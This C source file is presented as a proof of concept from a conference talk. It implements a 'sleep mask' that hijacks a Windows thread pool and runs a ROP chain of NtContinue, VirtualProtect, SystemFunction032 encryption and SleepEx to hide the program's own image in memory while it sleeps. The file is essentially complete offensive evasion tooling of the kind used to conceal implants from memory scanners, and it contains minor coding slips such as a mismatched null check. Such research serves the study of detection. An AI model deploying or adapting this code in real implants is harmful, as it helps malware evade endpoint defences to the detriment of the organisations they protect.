/*
* Author: Dimitri Di Cristofaro (GlenX) - @d_glenx
* 
* PoC demostrating a Sleep Mask exploiting thread pools and using a ROP chain to encrypt/decrypt itself
* This code is part of the talk "Squat The PoolParty" made at BEACON 2026
* https://github.com/SECFORCE/Squat-The-PoolParty
*/

#include <windows.h>
#include <stdio.h>
#include "utils.h"

#include "rop.h"

// PoolParty
#include "SetupExecution.h"
#include "IoCompletionHandle.h"



typedef
NTSTATUS
(NTAPI* NtContinue_t)(
    IN PCONTEXT ThreadContext,
    IN BOOLEAN RaiseAlert
    );

// Buffer with params to get thread pool context
typedef struct
{
    PCONTEXT ctx;
    HANDLE hEvent;
} THREAD_POOL_GET_CONTEXT, * PTHREAD_POOL_GET_CONTEXT;



// Struct definitions.    
typedef struct _CRYPT_BUFFER {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} CRYPT_BUFFER, * PCRYPT_BUFFER, DATA_KEY, * PDATA_KEY, CLEAR_DATA, * PCLEAR_DATA, CYPHER_DATA, * PCYPHER_DATA;



typedef struct _SLEEPMASK_PARAMS {
    PVOID ImageBase;
    DWORD ImageSize;
    DWORD sleep_time;
    HANDLE hEventWait;
} SLEEPMASK_PARAMS;

// Functions.
typedef NTSTATUS(WINAPI* tSystemFunction032)(PCRYPT_BUFFER pData, PDATA_KEY pKey);

// Function to create an event
HANDLE CreateMyEvent(BOOL bManualReset, BOOL bInitialState, LPCSTR lpName)
{
    HANDLE hEvent = CreateEventA(
        NULL,           // default security attributes
        bManualReset,   // manual-reset event?
        bInitialState,  // initial state (signaled or not)
        lpName          // event name (can be NULL)
    );

    return hEvent;
}


PVOID getNtContinue()
{
    // Find NtContinue
    PVOID NtContinue = NULL;
    HMODULE hNtdll = GetModuleHandleA("Ntdll.dll");
    if (hNtdll == 0)
    {
        printf("Cannot get handle to ntdll\n");
        return NULL;
    }

    NtContinue = GetProcAddress(hNtdll, "NtContinue");
    if (NtContinue == NULL)
    {
        printf("Could not find NtContinue\n");
        return NULL;
    }

    return NtContinue;
}





// Resolves all the functions and finds all the gadgets necessary to setup the ROP chain
// It then triggers the ROP chain execution 
// This function executes inside a thread of the thread pool
void masked_pool_party_asm
(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID                 Context,
    PTP_WAIT              Wait,
    TP_WAIT_RESULT        WaitResult
)
{
    printf("Starting the party..\n");

    CONTEXT ctxVirtualProtectRW = { 0 };
    CONTEXT ctxVirtualProtectRX = { 0 };
    CONTEXT ctxTrigger = { 0 };
    CONTEXT ctxDummyThread = { 0 };
    CONTEXT ctxEncryption = { 0 };

    SLEEPMASK_PARAMS* sleepmask_params = (SLEEPMASK_PARAMS*)Context;


    ROPPER rop_params = { 0 };


    HANDLE hEventVirtualProtect = INVALID_HANDLE_VALUE;
    DWORD threadId = 0;
    DWORD wait_res = 0;


    PVOID pSetEvent = NULL;
    PVOID popRspGadget = NULL;
    PVOID pSleepEx = NULL;
    PVOID pNtContinue = NULL;

    PVOID rcxGadget = NULL;
    PVOID addRspGadget = NULL;
    PVOID popRdxGadget = NULL;
    char* retGadget = NULL;
    PVOID shadowFixerGadget = NULL;
    PVOID rop_stack = NULL;
    PVOID origin_stack = NULL;




    // Sleepmask params
    PVOID dwMilliseconds = (PVOID)sleepmask_params->sleep_time;
    PVOID ImageBase = sleepmask_params->ImageBase;
    DWORD ImageSize = sleepmask_params->ImageSize;
    HANDLE hEventWait = sleepmask_params->hEventWait;

    // VirtualProtect params
    DWORD oldProtect = 0;
    DWORD virtualProtect_permissions = 0;

    // Sleep params
    PVOID bAlertable = NULL;


    // SystemFunction32 params
    PVOID pStackEncryption = 0;
    CRYPT_BUFFER Image = { 0 };
    DATA_KEY Key = { 0 };
    CHAR keyBuffer[16] = { 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18 };
    tSystemFunction032 pSystemFunction032 = NULL;

    // Load systemfunction032.
    HMODULE hAdvapi32 = LoadLibraryA("Advapi32.dll");
    if (hAdvapi32 == NULL)
    {
        printf("Error loading hAdvapi32\n");
        return -1;
    }
    pSystemFunction032 = (tSystemFunction032)GetProcAddress(hAdvapi32, "SystemFunction032");
    printf("pSystemFunction032 : 0x%p\n", pSystemFunction032);


    // Setup SystemFunction032 buffer

    // Initializing the image and key for SystemFunction032.
    Key.Buffer = keyBuffer;
    Key.Length = Key.MaximumLength = 16;

    Image.Buffer = ImageBase;
    Image.Length = Image.MaximumLength = ImageSize;


    // shadowFixerGadget = findGadget((PBYTE)"\x48\x83\xC4\x20\x5F\xC3", "xxxxxx"); // add rsp, 0x20 ; pop rdi ; ret


    rcxGadget = findGadget((PBYTE)"\x59\xC3", "xx"); // pop rcx ; ret
    //rcxGadget = 0x00007FF891C0A853;
    if (rcxGadget == NULL)
    {
        printf("Could not find pop rcx gadget\n");
        return -1;
    }
    printf("rcxGadget : 0x%p\n", rcxGadget);

    // Gadget to re-align stack after calling VirtualProtect
    addRspGadget = findGadget((PBYTE)"\x48\x83\xC4\x28\xC3", "xxxxx"); // add rsp , 0x28 ; ret
    //addRspGadget = 0x00007FF891BF2309;
    if (addRspGadget == NULL)
    {
        // TODO - if this fails we should look for shadowFixerGadget gadget
        printf("Could not find add rsp, 0x28 gadget\n");
        return -1;
    }
    printf("addRspGadget : 0x%p\n", addRspGadget);

    popRdxGadget = findGadget((PBYTE)"\x5A\xC3", "xx"); // pop rdx ; ret
    if (addRspGadget == NULL)
    {
        // TODO - if this fails we should look for shadowFixerGadget gadget
        printf("Could not find add pop rdx gadget\n");
        return -1;
    }
    printf("rdxGadget : 0x%p\n", popRdxGadget);

    pSetEvent = (PVOID)GetProcAddress(GetModuleHandleA("kernel32"), "SetEvent");
    if (pSetEvent == NULL)
    {
        printf("Could not find SetEvent\n");
        return -1;
    }
    printf("SetEvent : 0x%p\n", pSetEvent);


    pSleepEx = (PVOID)GetProcAddress(GetModuleHandleA("kernel32"), "SleepEx");
    if (pSleepEx == NULL)
    {
        printf("Could not find pSleepEx\n");
        return -1;
    }
    printf("SleepEx : 0x%p\n", pSleepEx);

    // Restore RSP from stack
    // \x5C\xC3
    // pop rsp ; ret
    popRspGadget = findGadget((PBYTE)"\x5C\xC3", "xx"); // pop rsp ; ret
    if (popRspGadget == NULL)
    {
        printf("Could not find pop RSP gadget\n");
        return -1;
    }
    printf("PopRSP : 0x%p\n", popRspGadget);


    pNtContinue = getNtContinue();
    printf("pNtContinue : 0x%p\n", pNtContinue);



    retGadget = (char*)addRspGadget + 4;


    //get_threapool_context(&ctxDummyThread);
    RtlCaptureContext(&ctxDummyThread);
    printf("[+] Thread Pool Context Obtained\n");


    // Add 8 bytes to RSP 
    // We want to pass the RSP value that we will have when the ROP chain starts executing.
    // Since we are going to `call` the ASM, the program will store the ret address in the stack so that it can return here after execution
    ctxDummyThread.Rsp += 8;


    // Copy dummy context into the contextes we are going to use to actually exec stuff
    memcpy(&ctxVirtualProtectRW, &ctxDummyThread, sizeof(CONTEXT));
    memcpy(&ctxVirtualProtectRX, &ctxDummyThread, sizeof(CONTEXT));
    memcpy(&ctxTrigger, &ctxDummyThread, sizeof(CONTEXT));
    memcpy(&ctxEncryption, &ctxDummyThread, sizeof(CONTEXT));


    // We use this struct just as an helper to pass the params that we need to setup_ROP_chain()
    // Execution of Encryption/Decryption is done via ROP chain 
    //printf("Image.Buffer = 0x%p\n", Image.Buffer);
    ctxEncryption.Rip = (DWORD_PTR)pSystemFunction032;
    ctxEncryption.Rcx = (DWORD_PTR)&Image;
    ctxEncryption.Rdx = (DWORD_PTR)&Key;

    // Setup params for NtContinue -> NtContinue(ctxVirtualProtectRW)
    //ctxTrigger.Rsp = rop_stack;
    ctxTrigger.Rip = rcxGadget; // pop rcx, ret
    printf("[-] NtContinue Params (Trigger - pCtxTrigger) @ 0x%p\n", (PVOID)&ctxTrigger);

    // Setup params for NtContinue -> VirtualProtect
    // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
    virtualProtect_permissions = PAGE_READWRITE;

    // Rsp is set by the ROP creation function
    //ctxVirtualProtectRW.Rsp = (char*)rop_stack + 0x10;
    ctxVirtualProtectRW.Rip = (DWORD_PTR)VirtualProtect;
    ctxVirtualProtectRW.Rcx = (DWORD_PTR)ImageBase;
    ctxVirtualProtectRW.Rdx = ImageSize;
    ctxVirtualProtectRW.R8 = virtualProtect_permissions;
    ctxVirtualProtectRW.R9 = (DWORD_PTR)&oldProtect;
    printf("[-] NtContinue Params (VirtualProtect(RW) - pCtxVirtualProtectRW) @ 0x%p\n", &ctxVirtualProtectRW);


    // Setup params for NtContinue -> VirtualProtect
    // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
    virtualProtect_permissions = PAGE_EXECUTE_READ;

    // Rsp is set by the ROP creation function
    // offset from the start of the ROP chain is 368 == 0x170
    //ctxVirtualProtectRX.Rsp = (char*)rop_stack + 0x170;
    ctxVirtualProtectRX.Rip = (DWORD_PTR)VirtualProtect;
    ctxVirtualProtectRX.Rcx = (DWORD_PTR)ImageBase;
    ctxVirtualProtectRX.Rdx = ImageSize;
    ctxVirtualProtectRX.R8 = virtualProtect_permissions;
    ctxVirtualProtectRX.R9 = (DWORD_PTR)&oldProtect;
    printf("[-] NtContinue Params (VirtualProtect(RX) - pCtxVirtualProtectRX) @ 0x%p\n", &ctxVirtualProtectRX);



    rop_params.pSetEvent = pSetEvent;
    rop_params.hEvent = hEventWait;
    rop_params.pRcxGadget = rcxGadget;
    rop_params.addRspGadget = addRspGadget;
    rop_params.pNtContinue = pNtContinue;
    rop_params.pCtxVirtualProtectRX = &ctxVirtualProtectRX;
    rop_params.pSystemFunction32 = pSystemFunction032;
    rop_params.pKey = &Key;
    rop_params.pPopRdxGadget = popRdxGadget;
    rop_params.pImage = &Image;
    rop_params.pSleepEx = pSleepEx;
    rop_params.bAlertable = bAlertable;
    rop_params.dwMilliseconds = dwMilliseconds;
    rop_params.retGadget = retGadget;
    rop_params.pCtxVirtualProtectRW = &ctxVirtualProtectRW;
    rop_params.pCtxTrigger = &ctxTrigger;
    rop_params.pPopRsp = popRspGadget;


    setup_rop(NULL, &rop_params);

}







// Setup the strruct containing the parameters to be passed to the thread pool handler
// Trigger thread pool execution and wait for an event to be signaled
void execute_sleepmask_threadpool(PVOID ImageBase, DWORD ImageSize, DWORD sleep_time)
{
    SLEEPMASK_PARAMS* params = NULL;
    DWORD wait_res = 0;
    HANDLE hProcess = (HANDLE)-1;
    LPCSTR event_name_wait = "WaitEvent";
    HANDLE hEventWait = INVALID_HANDLE_VALUE;

    printf("ThreadId: %d\n", GetCurrentThreadId());

    // Event to stop sleeping and restore execution flow
    hEventWait = CreateMyEvent(FALSE, FALSE, event_name_wait);
    if (hEventWait == NULL)
    {
        printf("CreateEvent to stop sleeping failed (%lu)\n", GetLastError());
        return -1;
    }
    printf("Event to stop sleeping created successfully: %p\n", hEventWait);

    params = malloc(sizeof(SLEEPMASK_PARAMS));
    if (params == NULL)
    {
        printf("Could not allocate memory to host the params\n");
        return;
    }

    params->ImageBase = ImageBase;
    params->ImageSize = ImageSize;
    params->sleep_time = sleep_time;
    params->hEventWait = hEventWait;


    HANDLE hIoCompletion = GetTargetThreadPoolIoCompletionHandle(hProcess);
    HANDLE event = SetupExecution(hProcess, hIoCompletion, masked_pool_party_asm, (PVOID)params);

    //SetEvent(event);
    //wait_res = WaitForSingleObject(hEventWait, INFINITE);
    wait_res = SignalObjectAndWait(event, hEventWait, INFINITE, FALSE);
    // WAIT_OBJECT_0 == 0x00000000L
    if (wait_res == WAIT_OBJECT_0)
    {
        printf("Event Signaled!\n");
    }
    else
    {
        printf("WaitForSingleObject returned with result: 0x%x\n", wait_res);
    }

    // CleanUp
    free(params);
    CloseHandle(hEventWait);
    CloseHandle(event);
}

int main()
{

    // Getting the image base.
    PVOID ImageBase = GetModuleHandleA(NULL);
    DWORD ImageSize = ((PIMAGE_NT_HEADERS)((DWORD_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew))->OptionalHeader.SizeOfImage;

    printf("ImageBase : 0x%p\n", ImageBase);
    printf("ImageSize : 0x%x\n", ImageSize);


    // This is needed for debugging.
    // If you want to attach a debugger, you cannot run the program directly in the debugger
    // You must wait until we reach this point and then attach it
    printf("Press any key to start\n");
    getchar();



    int ret = 0;
    // 1000 ms for testing purposes
    DWORD sleep_time = 1000;

    for (int i = 0; i < 10; i++)
    {
        printf("Sleeping..\n");
        execute_sleepmask_threadpool(ImageBase, ImageSize, sleep_time);
        printf("back!\n");
    }


    printf("done\n");


    return ret;
}
